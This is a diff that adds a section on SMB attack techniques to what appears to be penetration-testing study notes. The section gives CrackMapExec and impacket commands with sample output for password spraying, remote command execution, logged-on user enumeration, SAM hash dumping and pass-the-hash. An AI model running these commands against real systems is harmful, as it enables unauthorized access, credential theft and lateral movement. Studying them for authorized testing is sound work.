@@ -988,6 +988,185 @@ rpcclient $> enumdomusers
 
 </details>
 
+<details>
+<summary><h2>Protocol Specifics Attacks</h2></summary>
+
+If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).
+
+<details>
+<summary><h3>Brute Forcing and Password Spray</h3></summary>
+
+**Brute-Forcing**
+* Attempts as many passwords as possible against a single account.
+* Risk: May trigger account lockout if threshold is exceeded.
+* Recommendation: Only use if the lockout threshold is known; otherwise, avoid.
+
+**Password Spraying**
+* Targets multiple usernames with a single common password.
+* Safer approach to avoid account lockouts.
+* Guidelines:
+    * Use 2–3 password attempts per user if lockout threshold is unknown.
+    * Wait 30–60 minutes between attempts.
+
+**Using `CrackMapExec` for Password Spraying**
+
+```bash
+crackmapexec smb <TARGET_IP> -u <USER_LIST> -p '<PASSWORD>' --local-auth
+```
+
+**Example Output:**
+
+```bash
+# SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+# SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\Administrator:<PASSWORD> STATUS_LOGON_FAILURE 
+# SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\admin:<PASSWORD> STATUS_LOGON_FAILURE 
+# SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\fsmith:<PASSWORD> STATUS_LOGON_FAILURE 
+# SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\tcrash:<PASSWORD> STATUS_LOGON_FAILURE 
+
+# ...
+
+# SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\jurena:<PASSWORD> (Pwn3d!) 
+```
+
+> **Note:** By default `CrackMapExec` will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`.
+
+</details>
+
+<details>
+<summary><h3>Remote Code Execution (RCE)</h3></summary>
+
+To use impacket-psexec, we need to provide the domain/username, the password, and the IP address of our target machine.
+
+**Option 1 > Connect to a remote machine using `impacket-psexec`**
+
+```bash
+impacket-psexec <USER>:'<PASSWORD>'@<TARGET_IP>
+```
+
+**Example Output:**
+
+```bash
+# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+# [*] Requesting shares on <TARGET_IP>.....
+# [*] Found writable share ADMIN$
+# [*] Uploading file EHtJXgng.exe
+# [*] Opening SVCManager on <TARGET_IP>.....
+# [*] Creating service nbAc on <TARGET_IP>.....
+# [*] Starting service nbAc.....
+# [!] Press help for extra shell commands
+# Microsoft Windows [Version 10.0.19041.1415]
+# (c) Microsoft Corporation. All rights reserved.
+
+
+C:\Windows\system32>
+```
+
+> **NOTE:** The same options apply to `impacket-smbexec` and `impacket-atexec`.
+
+---
+
+**Option 2 > Run CMD or PowerShell commands using `crackmapexec`**
+
+```bash
+crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
+```
+
+**Example Output:**
+
+```bash
+# SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
+# SMB         <TARGET_IP> 445    WIN7BOX  [+] .\<USER>:<PASSWORD> (Pwn3d!)
+# SMB         <TARGET_IP> 445    WIN7BOX  [+] Executed command via smbexec
+# SMB         <TARGET_IP> 445    WIN7BOX  nt authority\system
+```
+
+> **Note:** If the `--exec-method` is not defined, CrackMapExec will try to execute the `atexec` method, if it fails you can try to specify the `--exec-method` smbexec.
+
+</details>
+
+<details>
+<summary><h3>Enumerating Logged-on Users</h3></summary>
+
+Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use CrackMapExec to enumerate logged-on users on all machines within the same network 10.10.110.0/24, which speeds up our enumeration process.
+
+**Example Command**
+
+```bash
+crackmapexec smb 10.10.110.0/24 -u <USER> -p '<PASSWORD>' --local-auth --logged-on-users
+```
+
+**Example Output:**
+
+```bash
+# SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+# SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
+# SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
+# SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
+# SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
+# SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
+# SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
+# SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
+# SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
+```
+
+</details>
+
+<details>
+<summary><h3>Extract Hashes from SAM Database</h3></summary>
+
+The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
+
+* Authenticate as another user
+* Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts
+* Pass The Hash
+
+**Example Command**
+
+```bash
+crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam
+```
+
+**Example Output:**
+
+```bash
+# SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+# SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
+# SMB         <TARGET_IP> 445    WIN7BOX  [+] Dumping SAM hashes
+# SMB         <TARGET_IP> 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+# SMB         <TARGET_IP> 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# SMB         <TARGET_IP> 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# SMB         <TARGET_IP> 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
+# SMB         <TARGET_IP> 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+# SMB         <TARGET_IP> 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
+# SMB         <TARGET_IP> 445    WIN7BOX  [+] Added 6 SAM hashes to the database
+```
+
+</details>
+
+<details>
+<summary><h3>Pass-the-Hash (PtH)</h3></summary>
+
+If we manage to get an **NTLM hash** of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called **Pass-the-Hash (PtH)**. PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket tool`, `SMBMap`, `CrackMapExec`, among other tools.
+
+**Example Command**
+
+```bash
+crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
+```
+
+**Example Output:**
+
+```bash
+# SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+# SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\<USER>:<NTLM_HASH> (Pwn3d!)
+```
+
+</details>
+
+
+</details>
+
 </details>
 
 ---
